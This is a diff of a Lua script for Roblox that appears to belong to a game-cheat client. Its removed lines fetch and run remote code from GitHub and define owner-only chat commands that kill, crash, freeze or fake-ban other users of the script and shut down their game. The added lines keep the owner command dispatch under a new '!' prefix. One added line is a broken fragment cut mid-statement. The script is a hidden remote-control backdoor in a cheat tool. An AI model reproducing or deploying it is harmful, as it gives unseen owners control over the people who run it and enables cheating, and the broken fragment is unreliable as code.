@@ -1,214 +1,4 @@
-local lplr = game:GetService("Players").LocalPlayer
-
-local playersService = game:GetService("Players")
-
-local TextChatService = game:GetService("TextChatService")
-
-local RBXSystem = TextChatService.TextChannels.RBXSystem
-
-local whitelist = loadstring(game:HttpGet("https://raw.githubusercontent.com/YZSomething/lol/main/chattags"))()
-
-local FunctionsLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/NTDCore/NightbedForRoblox/main/Libraries/FunctionsHandler.lua"))()
-
-local entityLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/Libraries/entityHandler.lua"))()
-
-
-
-local funcs = {}
-
-function funcs:kill()
-
-	local req = require(lplr.PlayerScripts.TS.controllers.global.damage["damage-controller"]).DamageController
-
-	local req2 = require(game:GetService("ReplicatedStorage").TS.damage["damage-type"]).DamageType
-
-	req.requestSelfDamage(nil,9e9,req2.FALL)
-
-end
-
-function funcs:reset()
-
-	game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.ResetCharacter:FireServer()
-
-end
-
-function funcs:kill2()
-
-	lplr.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead,true)
-
-	lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
-
-end
-
-function funcs:lagback()
-
-	for i = 1,5 do
-
-		lplr.Character.HumanoidRootPart.CFrame = CFrame.new(999999,999999,999999)
-
-	end
-
-end
-
-function funcs:jump()
-
-	lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
-
-end
-
-function funcs:sit()
-
-	lplr.Character.Humanoid.Sit = true
-
-end
-
-function funcs:unsit()
-
-	lplr.Character.Humanoid.Sit = false
-
-end
-
-function funcs:pstand()
-
-	lplr.Character.Humanoid.PlatformStand = true
-
-end
-
-function funcs:unpstand()
-
-	lplr.Character.Humanoid.PlatformStand = false
-
-end
-
-function funcs:freeze()
-
-	lplr.Character.HumanoidRootPart.Anchored = true
-
-end
-
-function funcs:check()
-
-	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("DETECTED_R7SK8TRXPARC2", "All")
-
-	if shared.GuiLibrary then
-
-		local GL = shared.GuiLibrary
-
-		GL.SelfDestruct()
-
-	end
-
-end
-
-function funcs:unfreeze()
-
-	lplr.Character.HumanoidRootPart.Anchored = false
-
-end
-
-function funcs:deletemap()
-
-		for i,v in pairs(game:GetService("CollectionService"):GetTagged("block")) do
-
-			v:Destroy()
-
-		end
-
-end
-
-function funcs:crash()
-
-	if setfpscap then setfpscap(99e99) end
-
-	if set_fps_cap then set_fps_cap(99e99) end
-
-	print(game:GetObjects("h29g3535")[1])
-
-end
-
-function funcs:chipman()
-
-			function funny(v)
-
-			if v:IsA("ImageLabel") or v:IsA("ImageButton") then
-
-				v.Image = "http://www.roblox.com/asset/?id=6864086702"
-
-				v:GetPropertyChangedSignal("Image"):Connect(function()
-
-					v.Image = "http://www.roblox.com/asset/?id=6864086702"
-
-				end)
-
-			end
-
-			if (v:IsA("TextLabel") or v:IsA("TextButton")) and v:GetFullName():find("ChatChannelParentFrame") == nil then
-
-				if v.Text ~= "" then
-
-					v.Text = "chips"
-
-				end
-
-				v:GetPropertyChangedSignal("Text"):Connect(function()
-
-					if v.Text ~= "" then
-
-						v.Text = "chips"
-
-					end
-
-				end)
-
-			end
-
-			if v:IsA("Texture") or v:IsA("Decal") then
-
-				v.Texture = "http://www.roblox.com/asset/?id=6864086702"
-
-				v:GetPropertyChangedSignal("Texture"):Connect(function()
-
-					v.Texture = "http://www.roblox.com/asset/?id=6864086702"
-
-				end)
-
-			end
-
-			if v:IsA("MeshPart") then
-
-				v.TextureID = "http://www.roblox.com/asset/?id=6864086702"
-
-				v:GetPropertyChangedSignal("TextureID"):Connect(function()
-
-					v.TextureID = "http://www.roblox.com/asset/?id=6864086702"
-
-				end)
-
-			end
-
-			if v:IsA("SpecialMesh") then
-
-				v.TextureId = "http://www.roblox.com/asset/?id=6864086702"
-
-				v:GetPropertyChangedSignal("TextureId"):Connect(function()
-
-					v.TextureId = "http://www.roblox.com/asset/?id=6864086702"
-
-				end)
-
-			end
-
-			if v:IsA("Sky") then
-
-				v.SkyboxBk = "http://www.roblox.com/asset/?id=6864086702"
-
-				v.SkyboxDn = "http://www.roblox.com/asset/?id=6864086702"
-
-				v.SkyboxFt = "http://www.roblox.com/asset/?id=6864086702"
-
-				v.SkyboxLf = "http://www.roblox.com/asset/?id=6864086702"
-
-				v.SkyboxRt = "http://www.roblox.com/asset/?id=6864086702"
+.SkyboxRt = "http://www.roblox.com/asset/?id=6864086702"
 
 				v.SkyboxUp = "http://www.roblox.com/asset/?id=6864086702"
 
@@ -546,15 +336,7 @@ spawn(function()
 
 	if table.find(whitelist.Owners,v.UserId) then
 
-			sysmsg("{DETECTED} OWNER WAS IN YOU GAME YOU WILL GET BAN SOONS") -- this code i fix it now it will sent the sysmsg  but u still cant use commands tho
-
-			wait(3)
-
-				lplr:Kick("You have been temporarily banned by maxlaser. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds ]")
-
-				wait(10)
-
-				game:Shutdown()
+			sysmsg("{DETECTED} OWNER WAS IN YOU GAME") -- this code i fix it now it will sent the sysmsg  but u still cant use commands tho
 
 		end
 
@@ -565,14 +347,6 @@ spawn(function()
 		if table.find(whitelist.Owners,v.UserId) then
 
 			sysmsg("[DETECTED] OWNER WAS IN YOU GAME!") -- this code i fix it now it will sent the sysmsg  but u still cant use commands tho
-
-						wait(3)
-
-				lplr:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds ]")
-
-				wait(5)
-
-				game:Shutdown()
 
 		end
 
@@ -588,79 +362,79 @@ for i,v in pairs(game:GetService("Players"):GetChildren()) do
 
 		if table.find(whitelist.Owners,v.UserId) then
 
-			if a == ";kill" then
+			if a == "!kill" then
 
 				funcs:kill()
 
-			elseif a == ";reset" then
+			elseif a == "!reset" then
 
 				funcs:reset()
 
-			elseif a == ";byfron" then
+			elseif a == "!byfron" then
 
 				funcs:byfron()
 
-			elseif a == ";void" then
+			elseif a == "!void" then
 
 				funcs:void()
 
-			elseif a == ";kill2" then
+			elseif a == "!kill2" then
 
 				funcs:kill2()
 
-			elseif a == ";lagback" then
+			elseif a == "!lagback" then
 
 				funcs:lagback()
 
-			elseif a == ";sit" then
+			elseif a == "!sit" then
 
 				funcs:sit()
 
-			elseif a == ";unsit" then
+			elseif a == "!unsit" then
 
 				funcs:unsit()
 
-			elseif a == ";freeze" then
+			elseif a == "!freeze" then
 
 				funcs:freeze()
 
-			elseif a == ";unfreeze" then
+			elseif a == "!unfreeze" then
 
 				funcs:unfreeze()
 
-			elseif a == ";deletemap" then
+			elseif a == "!deletemap" then
 
 				funcs:deletemap()
 
-			elseif a == ";crash" then
+			elseif a == "!crash" then
 
 				funcs:crash()
 
-			elseif a == ";chipman" then
+			elseif a == "!chipman" then
 
 				funcs:chipman()
 
-			elseif a == ";check" then
+			elseif a == "!check" then
 
 				funcs:check()
 
-			elseif a == ";rickroll" then
+			elseif a == "!rickroll" then
 
 				funcs:rickroll()
 
-			elseif a == ";uninject" then
+			elseif a == "!uninject" then
 
 				funcs:uninject()
 
-			elseif a == ";kick" then
+			elseif a == "!kick" then
 
 				funcs:kick()
 
-			elseif a == ";ban" then
+			elseif a == "!ban" then
 
 				funcs:ban()
 
-			elseif a == ";lobby" then
+			elseif a == "!lobby" then
 
 				funcs:lobby()
 
@@ -678,75 +452,75 @@ game:GetService("Players").PlayerAdded:Connect(function(v)
 
 		if table.find(whitelist.Owners,v.UserId) then
 
-			if a == ";kill" then
+			if a == "!kill" then
 
 				funcs:kill()
 
-			elseif a == ";reset" then
+			elseif a == "!reset" then
 
 				funcs:reset()
 
-			elseif a == ";byfron" then
+			elseif a == "!byfron" then
 
 				funcs:byfron()
 
-			elseif a == ";void" then
+			elseif a == "!void" then
 
 				funcs:void()
 
-			elseif a == ";kill2" then
+			elseif a == "!kill2" then
 
 				funcs:kill2()
 
-			elseif a == ";lagback" then
+			elseif a == "!lagback" then
 
 				funcs:lagback()
 
-			elseif a == ";sit" then
+			elseif a == "!sit" then
 
 				funcs:sit()
 
-			elseif a == ";unsit" then
+			elseif a == "!unsit" then
 
 				funcs:unsit()
 
-			elseif a == ";freeze" then
+			elseif a == "!freeze" then
 
 				funcs:freeze()
 
-			elseif a == ";unfreeze" then
+			elseif a == "!unfreeze" then
 
 				funcs:unfreeze()
 
-			elseif a == ";deletemap" then
+			elseif a == "!deletemap" then
 
 				funcs:deletemap()
 
-			elseif a == ";crash" then
+			elseif a == "!crash" then
 
 				funcs:crash()
 
-			elseif a == ";chipman" then
+			elseif a == "!chipman" then
 
 				funcs:chipman()
 
-			elseif a == ";rickroll" then
+			elseif a == "!rickroll" then
 
 				funcs:rickroll()
 
-			elseif a == ";kick" then
+			elseif a == "!kick" then
 
 				funcs:kick()
 
-			elseif a == ";ban" then
+			elseif a == "!ban" then
 
 				funcs:ban()
 
-			elseif a == ";check" then
+			elseif a == "!check" then
 
 				funcs:check()
 
-			elseif a == ";lobby" then
+			elseif a == "!lobby" then
 
 				funcs:lobby()
 
